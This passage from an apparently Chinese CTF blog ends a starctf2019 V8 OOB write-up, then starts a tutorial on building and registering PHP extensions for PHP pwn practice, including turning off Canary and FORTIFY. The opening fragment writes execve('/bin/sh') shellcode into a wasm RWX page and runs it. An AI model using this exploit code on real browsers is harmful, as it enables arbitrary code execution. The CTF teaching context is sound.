getAddress(wasmInstance);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwx_page_addr = read64(wasm_instance_addr -<span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr: &quot;</span> + hex(rwx_page_addr));</span><br><span class="line"><span class="keyword">let</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line">writeAny(rwx_page_addr,shellcode);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">f();</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221941594.png" alt="image-20220322194115446"></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2019/tree/master/pwn-OOB" >starctf2019/pwn-OOB at master · sixstars/starctf2019 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/02/10/PHP_PWN/">PHP_PWN</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-02-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-09</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、php拓展模块搭建和编写"   >
          <a href="#一、php拓展模块搭建和编写" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、php拓展模块搭建和编写" class="headerlink" title="一、php拓展模块搭建和编写"></a>一、php拓展模块搭建和编写</h1>
      
        <h2 id="1-创建模块模板"   >
          <a href="#1-创建模块模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-创建模块模板" class="headerlink" title="1.创建模块模板"></a>1.创建模块模板</h2>
      <p>找到php源码目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120778.png" alt="image-20220210174644261"></p>
<p>然后使用<code>ext_skel</code>创建一个模板</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=helloworld</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-编译模块"   >
          <a href="#2-编译模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-编译模块" class="headerlink" title="2.编译模块"></a>2.编译模块</h2>
      <p>随后进行编译，跳转到刚刚生成的模块文件夹路径<code>/path_to_php_src/ext/helloworld</code>，然后编译</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/56/bin/phpize</span><br><span class="line">./configure  --with-php-config=/www/server/php/56/bin/php-config</span><br></pre></td></tr></table></div></figure>

<p>这里需要指定一下<code>--with-php-config</code>，选择自己的<code>php-config</code>，当然如果本地的环境变量bin命令下直接有<code>php-config</code>也不用指定了，随后</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></div></figure>

<p>这样就可以在当前目录下生成了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120756.png" alt="image-20220210175900511"></p>
<p>其中<code>helloworld.c</code>即为创建的模板代码，但是不知道为什么5.6版本的编译完成后，不生成.so模块文件，可能是版本特性？</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* helloword extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_helloword.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; void helloword_test1()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; string helloword_test2( [ string $var ] )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">		<span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span></span><br><span class="line"><span class="function">	<span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Hello %s&quot;</span>, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLOWORD)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;helloword support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_HELLOWORD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(helloword)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="🔺注：不同版本创建模板"   >
          <a href="#🔺注：不同版本创建模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：不同版本创建模板" class="headerlink" title="🔺注：不同版本创建模板"></a>🔺注：不同版本创建模板</h2>
      <p>需要注意的是，在php7.3以上，<code>ext_skel</code>这个shell变成了<code>ext_skel.php</code>，所以我们使用如下来创建</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/73/bin/php ./ext_skel.php --ext helloword</span><br><span class="line">cd helloworld</span><br><span class="line">/www/server/php/73/bin/phpize</span><br><span class="line">./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config</span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>


        <h2 id="🔺注：默认的保护措施"   >
          <a href="#🔺注：默认的保护措施" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：默认的保护措施" class="headerlink" title="🔺注：默认的保护措施"></a>🔺注：默认的保护措施</h2>
      <p>同时需要注意的是，在configure设置完之后，保护措施也需要设置一下，默认编译的保护如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121247504.png" alt="image-20220212124731449"></p>
<p>可以看到除了RELRO没有加强保护之外，其他都加入了，我们在Makefile中可以进行相关的保护措施消除</p>
<p>这里试了很多遍，貌似只能关掉Canary保护和FORTIFY保护</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121258947.png" alt="image-20220212125859899"></p>

        <h2 id="3-加载模块"   >
          <a href="#3-加载模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-加载模块" class="headerlink" title="3.加载模块"></a>3.加载模块</h2>
      
        <h3 id="方法一："   >
          <a href="#方法一：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3>
      <p>直接<code>make install</code>，然后在对应的php.ini中添加<code>extension=helloword.so</code></p>

        <h3 id="方法二："   >
          <a href="#方法二：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3>
      <p>复制modules下的helloworld.so模块到对应的php扩展目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/</span><br></pre></td></tr></table></div></figure>

<p>同样也得在php.ini中添加extension</p>
<p>之后使用模板中函数测试即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">helloword_test1();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>如下即可成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120676.png"></p>
<p>这个php拓展模块其实跟linux内核有点像</p>

        <h2 id="🔺注：php-ini的设置"   >
          <a href="#🔺注：php-ini的设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：php-ini的设置" class="headerlink" title="🔺注：php.ini的设置"></a>🔺注：php.ini的设置</h2>
      <p>需要注意的是php.ini(php-fpm的php.ini)和php-cli.ini(php-cli的php.ini)的区别设置</p>
<p>对于php-fpm的php.ini，只会在web服务器上生效，而对于php-cli的php.ini才是在命令行中生效，所以如果我们需要使用命令行直接调试php，那么就需要修改php-cli中的php.ini才行的。以下是用宝塔linux搭建的Php环境，如果在命令行中生效则需要修改Php-cli.ini才行的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111605414.png" alt="image-20220211160511335"></p>

        <h2 id="4-编写函数"   >
          <a href="#4-编写函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-编写函数" class="headerlink" title="4.编写函数"></a>4.编写函数</h2>
      <p>以下是php7及以上的语法，之前版本的会有所不同</p>

        <h3 id="1-PHP-FUNCTION"   >
          <a href="#1-PHP-FUNCTION" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP-FUNCTION" class="headerlink" title="(1)PHP_FUNCTION"></a>(1)PHP_FUNCTION</h3>
      
        <h3 id="①框架编写"   >
          <a href="#①框架编写" class="heading-link"><i class="fas fa-link"></i></a><a href="#①框架编写" class="headerlink" title="①框架编写"></a>①框架编写</h3>
      <p>由<code>PHP_FUNCTION</code> 修饰的函数相当于直接的定义函数，所以我们定义函数时，需要用该修饰符来修饰，格式如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(funcName)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>至于这个<code>ZEND_PARSE_PARAMETERS_NONE();</code>代表定义的该函数无参数传递。</p>

        <h3 id="②参数传递"   >
          <a href="#②参数传递" class="heading-link"><i class="fas fa-link"></i></a><a href="#②参数传递" class="headerlink" title="②参数传递"></a>②参数传递</h3>
      <p>而当我们需要给函数传递参数时，就需要用到<code>ZEND_PARSE_PARAMETERS_START</code>来设置函数的参数个数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)       </span><br><span class="line">    <span class="function">Z_PARAM_OPTIONAL             </span></span><br><span class="line"><span class="function">    <span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span>   </span></span><br><span class="line"><span class="function"><span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//老版本写法：</span></span><br><span class="line"><span class="keyword">char</span> *var = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> var_len;</span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;var, &amp;var_len) == FAILURE) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>上述的<code>ZEND_PARSE_PARAMETERS_START(0, 1)</code>即代表传入参数个数为<code>0~1</code>，可变个数，如果个数不符合，则会触发异常。同样也可以设置为<code>1~1</code>，<code>2~4</code>等等之类的。</p>
<p><code>Z_PARAM_STRING</code>代表一种参数类型，即<code>char*</code>，传入的参数给到var，长度给到var_len，还有的其他类型如下。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">specifier    Fast ZPP API macro    args</span><br><span class="line">|    <span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">a    <span class="title">Z_PARAM_ARRAY</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">A    <span class="title">Z_PARAM_ARRAY_OR_OBJECT</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">b    <span class="title">Z_PARAM_BOOL</span><span class="params">(dest)</span>    dest - zend_bool</span></span><br><span class="line"><span class="function">C    <span class="title">Z_PARAM_CLASS</span><span class="params">(dest)</span>    dest - zend_class_entry*</span></span><br><span class="line"><span class="function">d    <span class="title">Z_PARAM_DOUBLE</span><span class="params">(dest)</span>    dest - <span class="keyword">double</span></span></span><br><span class="line"><span class="function">f    <span class="title">Z_PARAM_FUNC</span><span class="params">(fci, fcc)</span>    fci - zend_fcall_info, fcc - zend_fcall_info_cache</span></span><br><span class="line"><span class="function">h    <span class="title">Z_PARAM_ARRAY_HT</span><span class="params">(dest)</span>    dest - HashTable*</span></span><br><span class="line"><span class="function">H    <span class="title">Z_PARAM_ARRAY_OR_OBJECT_HT</span><span class="params">(dest)</span>    dest - HashTable*</span></span><br><span class="line"><span class="function">l    <span class="title">Z_PARAM_LONG</span><span class="params">(dest)</span>    dest - <span class="keyword">long</span></span></span><br><span class="line"><span class="function">L    <span class="title">Z_PARAM_STRICT_LONG</span><span class="params">(dest)</span>    dest - <span class="keyword">long</span></span></span><br><span class="line"><span class="function">o    <span class="title">Z_PARAM_OBJECT</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">O    <span class="title">Z_PARAM_OBJECT_OF_CLASS</span><span class="params">(dest, ce)</span>    dest - zval*</span></span><br><span class="line"><span class="function">p    <span class="title">Z_PARAM_PATH</span><span class="params">(dest, dest_len)</span>    dest - <span class="keyword">char</span>*, dest_len - <span class="keyword">int</span></span></span><br><span class="line"><span class="function">P    <span class="title">Z_PARAM_PATH_STR</span><span class="params">(dest)</span>    dest - zend_string*</span></span><br><span class="line"><span class="function">r    <span class="title">Z_PARAM_RESOURCE</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">s    <span class="title">Z_PARAM_STRING</span><span class="params">(dest, dest_len)</span>    dest - <span class="keyword">char</span>*, dest_len - <span class="keyword">int</span></span></span><br><span class="line"><span class="function">S    <span class="title">Z_PARAM_STR</span><span class="params">(dest)</span>    dest - zend_string*</span></span><br><span class="line"><span class="function">z    <span class="title">Z_PARAM_ZVAL</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">     <span class="title">Z_PARAM_ZVAL_DEREF</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">+    <span class="title">Z_PARAM_VARIADIC</span><span class="params">(<span class="string">&#x27;+&#x27;</span>, dest, num)</span>    dest - zval*, num <span class="keyword">int</span></span></span><br><span class="line"><span class="function">*    <span class="title">Z_PARAM_VARIADIC</span><span class="params">(<span class="string">&#x27;*&#x27;</span>, dest, num)</span>    dest - zval*, num <span class="keyword">int</span></span></span><br></pre></td></tr></table></div></figure>

<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233831#h3-3" >AntCTF ^ D3CTF 2021 hackphp - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="③参数信息定义"   >
          <a href="#③参数信息定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#③参数信息定义" class="headerlink" title="③参数信息定义"></a>③参数信息定义</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br></pre></td></tr></table></div></figure>

<p>这里就在<code>ZEND_BEGIN_ARG_INFO</code>中定义了参数arginfo_helloword_test1和arginfo_helloword_test2，然后在<code>ZEND_ARG_INFO</code>中设置参数名称，在<code>ZEND_ARG_INFO</code>中第一个参数代表是否为引用，第二个参数设置名称，比如这里就设置为<code>str</code>。这个参数信息的定义在之后的函数注册中需要用到。</p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.maoyingdong.com/php7_extension_development_tutorial_3/" >Linux下PHP7扩展开发入门教程3：编写第一个函数 | 毛英东的个人博客 (maoyingdong.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="2-函数注册"   >
          <a href="#2-函数注册" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-函数注册" class="headerlink" title="(2)函数注册"></a>(2)函数注册</h2>
      <p>和内核类似，需要将我们编写的函数进行注册</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如上，即使用<code>PHP_FE</code>来注册函数，需要传入函数名称和函数参数定义信息。</p>

        <h2 id="3-模块注册"   >
          <a href="#3-模块注册" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-模块注册" class="headerlink" title="(3)模块注册"></a>(3)模块注册</h2>
      <p>最后整个模块使用<code>zend_module_entry</code>进行模块注册</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>






        <h1 id="二、调试php拓展"   >
          <a href="#二、调试php拓展" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、调试php拓展" class="headerlink" title="二、调试php拓展"></a>二、调试php拓展</h1>
      
        <h2 id="1-查找模块"   >
